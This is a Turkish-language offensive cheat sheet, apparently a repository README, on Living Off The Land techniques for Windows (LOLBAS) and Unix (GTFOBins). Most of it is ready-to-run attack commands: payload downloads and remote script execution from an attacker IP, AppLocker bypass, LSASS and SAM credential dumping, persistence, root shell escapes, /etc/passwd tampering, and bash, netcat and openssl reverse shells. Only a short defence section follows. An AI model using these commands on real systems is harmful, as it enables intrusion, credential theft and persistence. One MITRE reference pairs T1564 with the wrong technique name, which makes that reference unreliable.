# 🏹 Living Off The Land (LOLBAS & GTFOBins) - Kapsamlı Başvuru Kılavuzu

[🇺🇸 English Version](../README.md)

```
  ██╗      ██████╗ ██╗     ██████╗  █████╗ ███████╗    ██████╗ ████████╗███████╗ ██████╗ 
  ██║     ██╔═══██╗██║     ██╔══██╗██╔══██╗██╔════╝   ██╔════╝ ╚══██╔══╝██╔════╝██╔═══██╗
  ██║     ██║   ██║██║     ██████╔╝███████║███████╗   ██║  ███╗   ██║   █████╗  ██║   ██║
  ██║     ██║   ██║██║     ██╔══██╗██╔══██║╚════██║   ██║   ██║   ██║   ██╔══╝  ██║   ██║
  ███████╗╚██████╔╝███████╗██████╔╝██║  ██║███████║██╗╚██████╔╝   ██║   ██║     ╚██████╔╝
  ╚══════╝ ╚═════╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝ ╚═════╝    ╚═╝   ╚═╝      ╚═════╝ 
                 Living Off The Land (Windows LOLBAS & Unix GTFOBins)
```

<p align="center">
  <img src="https://img.shields.io/badge/LOLBAS-Windows_Binaries-blue?style=for-the-badge" alt="LOLBAS">
  <img src="https://img.shields.io/badge/GTFOBins-Unix_PrivEsc-orange?style=for-the-badge" alt="GTFOBins">
  <img src="https://img.shields.io/badge/Defense_Evasion-Fileless-red?style=for-the-badge" alt="Defense Evasion">
  <img src="https://img.shields.io/badge/Living_Off_The_Land-Techniques-green?style=for-the-badge" alt="Living Off The Land">
</p>

<p align="center">
  <b>🛠️ Kod çalıştırmak, dosya indirmek ve yetki yükseltmek amacıyla işletim sisteminde kurulu meşru ikilileri istismar etme rehberi</b>
</p>

---

## 📋 İçindekiler

- [Giriş](#-giriş)
- [Neden Living Off The Land?](#-neden-living-off-the-land)
- [Bölüm 1: Windows LOLBAS](#-bölüm-1-windows-lolbas)
  - [Dosya İndirme ve Giriş (Ingress)](#dosya-i̇ndirme-ve-giriş-ingress)
  - [Kod Çalıştırma ve AppLocker Atlatma](#kod-çalıştırma-ve-applocker-atlatma)
  - [Kimlik Bilgisi Dökme (LSASS, SAM, LSA)](#kimlik-bilgisi-dökme-lsass-sam-lsa)
  - [Keşif ve Sistem Bilgisi](#keşif-ve-sistem-bilgisi)
  - [Kalıcılık ve Zamanlanmış Görevler](#kalıcılık-ve-zamanlanmış-görevler)
- [Bölüm 2: Unix / Linux GTFOBins](#-bölüm-2-unix--linux-gtfobins)
  - [SUID ve Sudo Kabuk Kaçışları](#suid-ve-sudo-kabuk-kaçışları)
  - [Dosya Okuma ve Yazma İstismarı](#dosya-okuma-ve-yazma-i̇stismarı)
  - [Ağ Aktarımı ve Ters Kabuklar (Reverse Shells)](#ağ-aktarımı-ve-ters-kabuklar-reverse-shells)
  - [GTFOBins Yüksek Etkili Yorumlayıcılar](#gtfobins-yüksek-etkili-yorumlayıcılar)
- [Hızlı Referans Tablosu](#-hızlı-referans-tablosu)
- [Savunma ve Tespit Önerileri](#-savunma-ve-tespit-önerileri)
- [Yasal Uyarı](#-yasal-uyarı)
- [Kaynaklar](#-kaynaklar)

---

## 🎯 Giriş

**Living Off The Land (LotL)**, saldırganların ve Red Team uzmanlarının ele geçirilen sistem üzerinde yabancı veya güvenilmeyen zararlı dosyalar bırakmak yerine, sistemde zaten yüklü bulunan güvenilir yasal ikilileri, betikleri ve kütüphaneleri kullanması prensibine dayanan ileri düzey sızma tekniğidir.

- **LOLBAS (Windows):** Living Off The Land Binaries, Scripts, and Libraries.
- **GTFOBins (Unix/Linux):** Kısıtlı kabukları atlatmak, dosya transfer etmek ve kök (root) yetkilerine yükselmek için kötüye kullanılabilecek Unix ikilileri koleksiyonu.

---

## ⚖️ Neden Living Off The Land?

1. 🛡️ **Uygulama Beyaz Listelerini Aşar:** `certutil.exe`, `rundll32.exe` veya `find` gibi ikililer Microsoft veya Linux dağıtım üreticisi tarafından dijital olarak imzalanmıştır; AppLocker, WDAC veya SELinux tarafından güvenilir kabul edilir.
2. 👁️ **İmza Tabanlı Antivirüs/EDR'ı Atlatır:** Diske harici bir şüpheli dosya (`.exe`, `.elf`) yazılmaz.
3. 📉 **Düşük Adli İzi (Low Footprint):** Sistem yöneticilerinin günlük olarak kullandığı meşru araçlar kullanıldığı için log analizlerinde şüphe çekme olasılığı düşüktür.

---

## 🪟 Bölüm 1: Windows LOLBAS

### Dosya İndirme ve Giriş (Ingress)

#### 1. Certutil.exe
```cmd
:: Uzak sunucudan dosya indirme
certutil.exe -urlcache -split -f http://10.10.14.5/shell.exe %TEMP%\shell.exe

:: Yerel dosyaları Base64 formatına çevirme ve geri çözme
certutil.exe -encode payload.exe encoded.txt
certutil.exe -decode encoded.txt payload.exe
```

#### 2. Bitsadmin.exe
```cmd
:: Arka planda asenkron dosya indirme
bitsadmin.exe /transfer myDownloadJob /download /priority FOREGROUND http://10.10.14.5/payload.exe C:\Windows\Temp\payload.exe
```

#### 3. Curl.exe ve PowerShell
```powershell
:: Windows 10+ üzerinde dahili gelen curl
curl.exe -o C:\Windows\Temp\tool.exe http://10.10.14.5/tool.exe

:: PowerShell ile dosya indirme
powershell -nop -c "Invoke-WebRequest -Uri 'http://10.10.14.5/s.ps1' -OutFile '$env:TEMP\s.ps1'"
```

---

### Kod Çalıştırma ve AppLocker Atlatma

#### 1. Mshta.exe (Uzak HTA/VBScript Çalıştırma)
```cmd
:: Doğrudan URL üzerinden HTA betiği çalıştırma (AppLocker atlatır)
mshta.exe http://10.10.14.5/payload.hta

:: Satır içi VBScript çalıştırma
mshta.exe vbscript:Close(Execute("CreateObject(""WScript.Shell"").Run ""cmd.exe /c calc.exe"""))
```

#### 2. Regsvr32.exe (Squiblydoo Tekniği)
```cmd
:: Diske dosya yazmadan COM nesnesi ile uzak scriptlet (.sct) çalıştırma
regsvr32.exe /s /n /u /i:http://10.10.14.5/shell.sct scrobj.dll
```

#### 3. Rundll32.exe
```cmd
:: DLL içindeki dışa aktarılan fonksiyonu çalıştırma
rundll32.exe payload.dll,EntryPoint

:: Bellekte JavaScript kodu yürütme
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert('Pwned');
```

#### 4. Wmic.exe (XSL Betiği Yürütme)
```cmd
:: Uzak XSL şablonu üzerinden kod çalıştırma
wmic.exe process get brief /format:"http://10.10.14.5/script.xsl"
```

#### 5. Installutil.exe
```cmd
:: İmzalı .NET yükleyicisi üzerinden engelsiz kod çalıştırma
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U MaliciousApp.exe
```

---

### Kimlik Bilgisi Dökme (LSASS, SAM, LSA)

#### 1. Rundll32.exe + Comsvcs.dll (LSASS Bellek Dökümü)
Mimikatz çalıştırmadan dahili Windows DLL'i ile LSASS dökümü alma:
```powershell
# LSASS İşlem Kimliğini (PID) bulun
$lsassPid = (Get-Process lsass).Id

# comsvcs.dll ile minidump oluşturun (Yönetici yetkisi gerekir)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPid C:\Windows\Temp\lsass.dmp full
```

#### 2. Reg.exe (SAM, SYSTEM ve SECURITY Kovanlarını Kaydetme)
```cmd
:: Çevrimdışı parola analizi için kovanları diske kaydetme
reg.exe save HKLM\SAM C:\Windows\Temp\sam.hive
reg.exe save HKLM\SYSTEM C:\Windows\Temp\system.hive
reg.exe save HKLM\SECURITY C:\Windows\Temp\security.hive
```

---

### Keşif ve Sistem Bilgisi

```cmd
:: Etki alanı denetleyicilerini bulma
nltest /dclist:domain.local

:: Etki alanı güven ilişkilerini sorgulama
nltest /domain_trusts

:: RSAT kurmadan Active Directory nesnelerini arama
dsquery computer
dsquery user -name *admin*

:: Açık ağ portlarını işlem kimlikleriyle listeleme
netstat -ano
```

---

### Kalıcılık ve Zamanlanmış Görevler

```cmd
:: SYSTEM yetkisinde her 15 dakikada bir çalışan zamanlanmış görev tanımlama
schtasks.exe /create /tn "SecurityHealthService" /tr "C:\Windows\Temp\agent.exe" /sc minute /mo 15 /ru "NT AUTHORITY\SYSTEM"

:: Geçerli kullanıcı için Kayıt Defteri Run anahtarı ekleme
reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\Windows\Temp\shell.exe" /f
```

---

## 🐧 Bölüm 2: Unix / Linux GTFOBins

### SUID ve Sudo Kabuk Kaçışları

Bir ikilide SUID biti varsa (`chmod u+s`) veya `sudo -l` listesinde yer alıyorsa doğrudan root kabuğu elde edilebilir:

#### 1. Sudo / SUID `find`
```bash
# SUID
find . -exec /bin/sh -p \; -quit

# Sudo
sudo find . -exec /bin/sh \; -quit
```

#### 2. Sudo / SUID `vim` / `vi`
```bash
# vim içinden kabuğa kaçma
:!/bin/sh

# Tek satırda çalıştırma
vim -c ':!/bin/sh'
```

#### 3. Sudo / SUID `awk`
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```

#### 4. Sudo / SUID `tar`
```bash
# Checkpoint parametresi ile komut yürütme
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

#### 5. Sudo / SUID `nano`
```bash
# nano içindeyken: Ctrl+R, ardından Ctrl+X basın ve şunu yazın:
reset; sh 1>&0 2>&0
```

#### 6. Sudo / SUID `env`
```bash
# SUID
env /bin/sh -p

# Sudo
sudo env /bin/sh
```

#### 7. Sudo `less` / `more` / `man`
```bash
# Sayfalayıcı açıkken !/bin/sh yazıp Enter'a basın
!/bin/sh
```

---

### Dosya Okuma ve Yazma İstismarı

Kabuk açılamıyorsa dosya okuma/yazma araçlarıyla `/etc/passwd` üzerine yazabilir veya `/etc/shadow` okunabilir:

#### Sudo/SUID `tee` ile `/etc/passwd` Üzerine Yazma
```bash
# Parola hash'i oluşturun: openssl passwd -1 -salt evil P@ss123
echo 'root2:$1$evil$TNy7V...:0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd
su root2
```

#### SUID İkilileri ile Hassas Dosyaları Okuma
```bash
# Base64
base64 /etc/shadow | base64 --decode

# Xxd
xxd /etc/shadow | xxd -r

# Head / Tail
head -n 100 /etc/shadow
```

---

### Ağ Aktarımı ve Ters Kabuklar (Reverse Shells)

`curl` veya `wget` olmadan dosya aktarımı ve kabuk alma:

#### 1. Doğal Bash TCP Ters Kabuk
```bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
```

#### 2. Doğal Netcat (`-e` Parametresiz)
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 > /tmp/f
```

#### 3. OpenSSL ile Şifreli Ters Kabuk
Saldırgan makinede:
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
```
Hedef sistemde:
```bash
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.10.14.5:4444 > /tmp/s; rm /tmp/s
```

---

### GTFOBins Yüksek Etkili Yorumlayıcılar

Yorumlayıcılar Sudo veya SUID ile yetkilendirilmişse:

```bash
# Python
sudo python3 -c 'import os; os.system("/bin/sh")'

# Perl
sudo perl -e 'exec "/bin/sh";'

# Ruby
sudo ruby -e 'exec "/bin/sh"'

# PHP
sudo php -r "system('/bin/sh');"

# Lua
sudo lua -e 'os.execute("/bin/sh")'
```

---

## 📊 Hızlı Referans Tablosu

| İşletim Sistemi | İkili | Amaç | İstismar Komutu |
|-----------------|-------|------|-----------------|
| **Win** | `certutil.exe` | Dosya İndirme | `certutil -urlcache -split -f http://<IP>/file out.exe` |
| **Win** | `mshta.exe` | Uzak HTA Çalıştırma | `mshta http://<IP>/payload.hta` |
| **Win** | `regsvr32.exe` | Scriptlet Çalıştırma | `regsvr32 /s /n /u /i:http://<IP>/s.sct scrobj.dll` |
| **Win** | `rundll32.exe` | LSASS Bellek Dökümü | `rundll32 comsvcs.dll, MiniDump <PID> out.dmp full` |
| **Unix**| `find` | SUID Kök Kabuk | `find . -exec /bin/sh -p \; -quit` |
| **Unix**| `awk` | Sudo Kabuk | `sudo awk 'BEGIN {system("/bin/sh")}'` |
| **Unix**| `vim` | Kabuğa Kaçış | `vim -c ':!/bin/sh'` |
| **Unix**| `tee` | Dosya Üzerine Yazma | `echo "root2:..." \| sudo tee -a /etc/passwd` |

---

## 🛡️ Savunma ve Tespit Önerileri

1. **Komut Satırı Günlüklemesini (Logging) Açın:**
   `certutil`, `mshta` ve `rundll32` araçlarına iletilen olağan dışı URL ve dosya parametrelerini izlemek için **Sysmon (Olay Kimliği 1)** veya Windows İşlem Oluşturma Denetimini (Olay Kimliği 4688) etkinleştirin.
2. **Şüpheli Ebeveyn-Çocuk Süreçlerini Engelleyin:**
   `mshta.exe` veya `regsvr32.exe` üzerinden `cmd.exe` veya `powershell.exe` başlatılmasını izleyip engelleyin.
3. **Sudo Kurallarını Kısıtlayın:**
   `/etc/sudoers` dosyasında joker karakterlerden (`*`) kaçının. Kullanıcıların metin düzenleyicilerini (`vim`, `nano`) veya derleyicileri root yetkisiyle çalıştırmasına asla izin vermeyin.

---

## ⚠️ Yasal Uyarı

> **ÖNEMLİ:** Living Off The Land teknikleri meşru sistem yönetim araçlarını kötüye kullanır. Bu kılavuz yalnızca yetkili güvenlik değerlendirmeleri, savunma sıkılaştırma çalışmaları ve eğitim amaçlı hazırlanmıştır.

---

## 📚 Kaynaklar

- [LOLBAS Projesi Resmi Deposu](https://lolbas-project.github.io/)
- [GTFOBins Resmi Deposu](https://gtfobins.github.io/)
- [MITRE ATT&CK: Subverting Trust Controls (T1564)](https://attack.mitre.org/techniques/T1564/)
